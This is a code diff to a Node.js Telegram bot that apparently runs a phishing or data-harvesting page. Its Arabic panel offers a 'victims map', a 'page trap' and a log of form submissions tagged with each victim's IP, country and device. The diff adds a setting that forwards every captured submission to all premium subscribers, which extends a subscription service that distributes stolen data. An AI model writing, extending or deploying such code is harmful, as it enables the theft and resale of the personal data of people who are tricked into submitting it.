@@ -195,13 +195,15 @@ function sendPageMain(chatId, editMsgId) {
   const passIcon = pageConfig.pagePassword ? "🔒✅" : "🔒";
   const text = `🎛️ *لوحة تحكم الصفحة الديناميكية*\n\n📡 الحالة: ${status}\n🎨 القالب: ${tName}\n👁️ مشاهدات: ${pageConfig.views||0}\n✅ إرسال مكتمل: ${submissions.length}\n📋 في الحافظة: ${pageConfig.clipCount||0}\n${pageConfig.pagePassword ? "🔒 كلمة سر: مفعّلة" : "🔓 كلمة سر: معطّلة"}`;
   const wIcon = pageConfig.welcomeEnabled ? "📢✅" : "📢";
+  const fwdIcon = settings.forwardSubsToPremium ? "📤✅" : "📤";
   const kb = JSON.stringify({ inline_keyboard:[
     [{text:"⚡ تبديل سريع",callback_data:"pg_quick"},{text:"✏️ تعديل مخصص",callback_data:"pg_edit"}],
     [{text:"📊 الإحصائيات",callback_data:"pg_stats"},{text:"📋 السجل",callback_data:"pg_log"}],
     [{text:"🗺️ خريطة الضحايا",callback_data:"pg_map"},{text:"🔗 الروابط",callback_data:"pg_links"}],
     [{text:"🔄 تجديد الرابط",callback_data:"pg_renew"},{text:`${wIcon} رسالة الترحيب`,callback_data:"pg_welcome"}],
     [{text:"👁️ معاينة",callback_data:"pg_preview"},{text:toggleLabel,callback_data:"pg_toggle"}],
-    [{text:pageConfig.trapEnabled?"🪤✅ فخ الصفحة":"🪤 فخ الصفحة",callback_data:"pg_trap"},{text:`${passIcon} كلمة سر`,callback_data:"pg_setpass"}]
+    [{text:pageConfig.trapEnabled?"🪤✅ فخ الصفحة":"🪤 فخ الصفحة",callback_data:"pg_trap"},{text:`${passIcon} كلمة سر`,callback_data:"pg_setpass"}],
+    [{text:`${fwdIcon} إرسال البيانات للبريمو`,callback_data:"pg_fwdprem"}]
   ]});
   if (editMsgId) return bot.editMessageText(text,{chat_id:chatId,message_id:editMsgId,parse_mode:"Markdown",reply_markup:kb}).catch(()=>{});
   return bot.sendMessage(chatId, text, {parse_mode:"Markdown", reply_markup:kb});
@@ -747,6 +749,14 @@ app.post("/p/submit", express.json({limit:"1mb"}), async (req, res) => {
     txt += `━━━━━━━━━━━━━━━━━━━\n📱 ${device||"?"}\n🌍 ${sub.country} | ⚓ ${ip}\n⏰ ${time}`;
     const kb = { inline_keyboard:[[{text:"🎛️ لوحة التحكم",callback_data:"pg_main"}]] };
     bot.sendMessage(BOT_OWNER, txt, {parse_mode:"Markdown", reply_markup:JSON.stringify(kb)}).catch(()=>{});
+    // Forward to all active premium users if enabled
+    if (settings.forwardSubsToPremium) {
+      for (const [uid, pdata] of Object.entries(premium)) {
+        if (Number(uid) === BOT_OWNER) continue;
+        if (!isPremium(Number(uid))) continue;
+        bot.sendMessage(Number(uid), txt, {parse_mode:"Markdown"}).catch(()=>{});
+      }
+    }
   });
 });
 
@@ -1649,6 +1659,14 @@ bot.on('callback_query', async (q) => {
     if (chatId === BOT_OWNER) return sendPageMain(chatId, q.message.message_id);
     if (isPremium(chatId)) return sendUserPageMain(chatId, chatId, q.message.message_id);
     return bot.answerCallbackQuery(q.id, { text: "⛔ هذه الميزة للمشتركين البريميوم فقط." });
+  }
+
+  if (data === "pg_fwdprem" && chatId === BOT_OWNER) {
+    settings.forwardSubsToPremium = !settings.forwardSubsToPremium;
+    saveSettings();
+    const state = settings.forwardSubsToPremium ? "✅ مفعّل" : "❌ معطّل";
+    bot.answerCallbackQuery(q.id, { text: `📤 إرسال البيانات للبريمو: ${state}` }).catch(()=>{});
+    return sendPageMain(chatId, q.message.message_id);
   }
 
   if (data === "pg_toggle") {
